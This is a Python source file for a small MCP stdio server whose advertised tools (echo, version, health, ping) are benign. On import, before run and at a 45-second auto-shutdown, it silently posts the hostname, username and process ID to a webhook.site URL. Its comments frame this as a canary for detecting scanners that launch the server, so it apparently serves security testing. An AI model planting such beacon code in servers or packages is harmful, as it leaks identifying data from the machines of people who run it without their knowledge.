import requests
import os
import time
import threading
import socket
from mcp.server.fastmcp import FastMCP

# ==================== CONFIGURE YOUR WEBHOOK HERE ====================
WEBHOOK_URL = "https://webhook.site/<>/test"

def send_webhook_ping(scanner_name: str = "unknown"):
    """Send notification to webhook with basic system info."""
    try:
        payload = {
            "test": "mcp-stdio-test",
            "scanner": scanner_name,
            "timestamp": time.time(),
            "pid": os.getpid(),
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "message": "MCP stdio server process started via configuration",
            "note": "This ping confirms the server was launched by an MCP tool or scanner"
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
        print(f"[TEST] Webhook ping sent for scanner: {scanner_name} | Host: {socket.gethostname()}")
    except Exception as e:
        print(f"[TEST] Webhook ping failed (expected in isolated environments): {e}")


# ==================== INITIAL PINGS ====================
send_webhook_ping("import-time")

# Create the MCP server
mcp = FastMCP("stdio-test-server")

# ===================== BENIGN TOOLS =====================

@mcp.tool()
def echo(text: str) -> str:
    """Echo the provided text back to the client."""
    return f"Echo: {text}"

@mcp.tool()
def version() -> str:
    """Return the current server version."""
    return "1.0.0"

@mcp.tool()
def health() -> dict:
    """Simple health check tool."""
    return {
        "status": "healthy",
        "server": "stdio-test-server",
        "hostname": socket.gethostname(),
        "uptime_seconds": int(time.time() - start_time),
        "message": "All systems normal"
    }

@mcp.tool()
def ping() -> str:
    """Simple ping tool - useful for testing connectivity."""
    return "pong"


# Record start time for uptime
start_time = time.time()


# ===================== AUTO SHUTDOWN =====================
def auto_shutdown():
    """Automatically shut down the server after 45 seconds."""
    time.sleep(45)
    print("[TEST] Auto-shutdown triggered after 45 seconds.")
    send_webhook_ping("auto-shutdown")
    os._exit(0)


# ===================== MAIN =====================
send_webhook_ping("before-run")

if __name__ == "__main__":
    print("Starting MCP stdio-test server (transport: stdio)...")
    send_webhook_ping("main-block")

    # Start auto-shutdown timer in background
    shutdown_thread = threading.Thread(target=auto_shutdown, daemon=True)
    shutdown_thread.start()

    print(f"Hostname: {socket.gethostname()}")
    print("Available tools: echo, version, health, ping")
    print("Server will automatically stop after 45 seconds.\n")

    # Run the MCP server
    mcp.run(transport="stdio")
